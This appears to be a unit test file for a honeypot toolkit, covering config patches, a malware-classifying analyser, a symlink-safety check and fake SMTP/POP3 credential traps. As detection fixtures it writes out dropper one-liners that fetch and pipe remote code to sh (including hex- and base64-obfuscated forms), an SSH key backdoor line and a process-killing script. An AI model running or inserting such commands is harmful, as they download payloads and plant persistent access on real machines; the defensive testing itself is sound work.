# The honeypot side: patches for Cowrie/OpenCanary, hp-fileinfo's static analysis and hp-traps' fake services.
import asyncio, importlib.machinery, importlib.util, json, os, shutil, struct, tempfile, unittest

from tests.helpers import ROOT

import patches  # noqa: E402  (honeypot/ is on sys.path)


def load(name, path):
    loader = importlib.machinery.SourceFileLoader(name, path)
    spec = importlib.util.spec_from_loader(name, loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


fileinfo = load("hp_fileinfo", os.path.join(ROOT, "honeypot", "hp-fileinfo"))


class Patches(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.d)

    def write(self, name, text):
        p = os.path.join(self.d, name)
        open(p, "w").write(text)
        return p

    def test_free_patch_once(self):
        p = self.write("free.py", "class X:\n    def m(self):\n" + patches.FREE_OLD + "\n                    pass\n" + patches.FREE_OLD2 + "\n")
        self.assertEqual(patches.cowrie_free(p), 0)
        self.assertIn("Huginn patch", open(p).read())
        self.assertTrue(os.path.exists(p + ".orig"))
        self.assertEqual(patches.cowrie_free(p), 3)

    def test_free_upstream_changed(self):
        p = self.write("free.py", "something else\n")
        self.assertEqual(patches.cowrie_free(p), 1)
        self.assertEqual(open(p).read(), "something else\n")

    def test_opencanary_ports(self):
        p = self.write("c.json", json.dumps({"http.enabled": True, "http.port": 8080, "httpproxy.enabled": False, "httpproxy.port": 8080,
                                             "ftp.enabled": False, "ftp.port": 21}))
        self.assertEqual(patches.opencanary_ports(p), 0)
        with open(p) as fh:
            c = json.load(fh)
        self.assertEqual(c["http.port"], 8080)
        self.assertGreaterEqual(c["httpproxy.port"], 62000)
        self.assertEqual(c["ftp.port"], 21)
        self.assertEqual(patches.opencanary_ports(p), 3)


class FileInfo(unittest.TestCase):
    def elf(self, bits, endian, machine):
        e = "<" if endian == "little" else ">"
        return b"\x7fELF" + bytes([2 if bits == 64 else 1, 1 if endian == "little" else 2]) + b"\x00" * 12 + struct.pack(e + "H", machine) + b"\x00" * 40

    def test_classify(self):
        self.assertEqual(fileinfo.classify(self.elf(64, "little", 62)), ("ELF 64-bit", "x86-64"))
        self.assertEqual(fileinfo.classify(self.elf(32, "little", 40)), ("ELF 32-bit", "arm"))
        self.assertEqual(fileinfo.classify(self.elf(32, "big", 8)), ("ELF 32-bit", "mips"))
        self.assertEqual(fileinfo.classify(self.elf(32, "little", 8))[1], "mipsel")
        self.assertEqual(fileinfo.classify(b"#!/bin/sh\nwget x\n")[0], "script (/bin/sh)")
        self.assertEqual(fileinfo.classify(b"\x1f\x8b\x08")[0], "gzip")

    def test_families(self):
        self.assertEqual(fileinfo.family(b"\x7fELF....xmrig....donate-level"), "XMRig (Monero miner)")
        self.assertEqual(fileinfo.family(b"\x7fELF..GETLOCALIP..HOLD"), "Gafgyt / Bashlite")
        self.assertEqual(fileinfo.family(b"\x7fELF../dev/watchdog..TSource Engine Query"), "Mirai")
        self.assertEqual(fileinfo.family(b"#!/bin/sh\ncd /tmp; wget http://x/a; chmod 777 a; ./a"), "Dropper script")
        self.assertEqual(fileinfo.family(b"echo ssh-rsa AAAAB3 >> ~/.ssh/authorized_keys"), "SSH key backdoor")
        killer = (b"#!/bin/sh\nfor proc_dir in /proc/*; do\n pid=${proc_dir##*/}\n result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n"
                  b" if [ \"$result\" != \"${result%(deleted)}\" ]; then\n kill -9 \"$pid\"\n fi\ndone\n")
        self.assertEqual(fileinfo.family(killer), "Competitor killer")
        self.assertEqual(fileinfo.family(b"nothing interesting here"), "")

    def test_hidden_loaders(self):
        # Real-world shapes seen on a honeypot (with documentation addresses): a fallback loader, the same as \\x escapes,
        # and a base64 one-liner. All three are droppers, and the C2 address inside is found.
        loader = b"S=203.0.113.75; (wget http://$S/p -O-||curl http://$S/p||busybox wget http://$S/p -O-) | sh"
        hexed = b"".join(b"\\x%02x" % c for c in loader)
        b64 = b"echo " + __import__("base64").b64encode(loader) + b" | base64 -d | sh"
        for sample in (loader, hexed, b64):
            u = fileinfo.unpack(sample)
            self.assertEqual(fileinfo.family(u), "Dropper script", sample[:30])
            self.assertIn("203.0.113.75", " ".join(fileinfo.iocs(u)) + u.decode("latin-1"))
        self.assertEqual(fileinfo.unpack(b"\x7fELF\\x41\\x42"), b"\x7fELF\\x41\\x42")   # binaries are left alone

    def test_iocs(self):
        out = fileinfo.iocs(b"wget http://8.8.4.4/bins/mips; 10.0.0.1 1.2.3.4:4444 http://example.com/a.sh.")
        self.assertIn("http://8.8.4.4/bins/mips", out)
        self.assertIn("1.2.3.4:4444", out)
        self.assertIn("http://example.com/a.sh", out)
        self.assertNotIn("10.0.0.1", out)
        self.assertNotIn("8.8.4.4", out)      # already part of a URL


class ExportSymlinks(unittest.TestCase):
    # hp-export runs as root. A log replaced by a symlink (to /etc/shadow, say) must never be followed.
    def test_catfiles_skips_symlinks(self):
        import subprocess
        d = tempfile.mkdtemp()
        try:
            with open(os.path.join(d, "secret"), "w") as fh:
                fh.write("TOP-SECRET-LINE\n")
            with open(os.path.join(d, "log.json"), "w") as fh:
                fh.write("REAL-LOG-LINE\n")
            os.symlink(os.path.join(d, "secret"), os.path.join(d, "log.json.2026-11-01"))
            with open(os.path.join(ROOT, "honeypot", "hp-export")) as fh:
                src = fh.read()
            func = src[src.index("catfiles() {"):src.index("\n}\n", src.index("catfiles() {")) + 3]
            out = subprocess.run(["bash", "-c", func + '\ncatfiles "%s/log.json*"' % d], capture_output=True, text=True, timeout=20).stdout
            self.assertIn("REAL-LOG-LINE", out)
            self.assertNotIn("TOP-SECRET-LINE", out)
        finally:
            shutil.rmtree(d)


class Traps(unittest.TestCase):
    def setUp(self):
        self.d = tempfile.mkdtemp()
        os.environ["LOGS_DIRECTORY"] = self.d
        self.t = load("hp_traps", os.path.join(ROOT, "honeypot", "hp-traps.py"))

    def tearDown(self):
        shutil.rmtree(self.d)

    def events(self):
        out = []
        for f in os.listdir(self.d):
            with open(os.path.join(self.d, f)) as fh:
                out += [json.loads(l) for l in fh]
        return out

    def talk(self, service, lines, expect_close=True):
        async def run():
            srv = await asyncio.start_server(self.t.make(service), "127.0.0.1", 0)
            port = srv.sockets[0].getsockname()[1]
            r, w = await asyncio.open_connection("127.0.0.1", port)
            got = [await asyncio.wait_for(r.readline(), 5)]
            for l in lines:
                w.write(l)
                await w.drain()
                got.append(await asyncio.wait_for(r.readline(), 5))
            w.close()
            srv.close()
            await srv.wait_closed()
            await asyncio.sleep(0.1)
            return [g.decode("utf-8", "replace") for g in got]
        return asyncio.run(run())

    def test_smtp_auth_logged(self):
        import base64
        cred = base64.b64encode(b"\x00user@example.com\x00hunter2").decode()
        got = self.talk("smtp", [b"EHLO x\r\n"])
        self.assertTrue(got[0].startswith("220 "))
        got = self.talk("smtp", [b"HELO x\r\n", ("AUTH PLAIN %s\r\n" % cred).encode(), b"QUIT\r\n"])
        logins = [e for e in self.events() if e["event"] == "login"]
        self.assertEqual((logins[0]["username"], logins[0]["password"]), ("user@example.com", "hunter2"))
        self.assertEqual(logins[0]["src_ip"], "127.0.0.1")

    def test_pop3_login(self):
        got = self.talk("pop3", [b"USER bob\r\n", b"PASS secret\r\n"])
        self.assertTrue(got[0].startswith("+OK"))
        self.assertTrue(got[2].startswith("-ERR"))
        self.assertTrue(any(e["event"] == "login" and e["password"] == "secret" for e in self.events()))


if __name__ == "__main__":
    unittest.main()
